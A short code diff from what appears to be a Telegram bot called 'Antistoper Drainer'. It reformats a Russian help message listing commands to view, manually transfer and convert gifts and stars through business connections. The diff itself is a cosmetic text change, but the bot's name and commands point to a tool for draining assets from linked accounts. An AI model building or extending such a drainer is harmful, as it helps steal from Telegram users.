@@ -216,7 +216,7 @@ async def start_command(message: Message):
             "<b>Antistoper Drainer</b>\n\n"
             "🔗 /gifts - просмотреть гифты\n"
             "🔗 /stars - просмотреть звезды\n"
-            "🔗 /transfer <code>&lt;owned_id&gt;</code> <code>&lt;business_connect&gt;</code> - передать гифт вручную\n"
+            "🔗 /transfer <code>&lt;owned_id&gt; &lt;business_connect&gt;</code> - передать гифт вручную\n"
             "🔗 /convert - конвертировать подарки в звезды"
         )
         if WEBHOOK_URL:
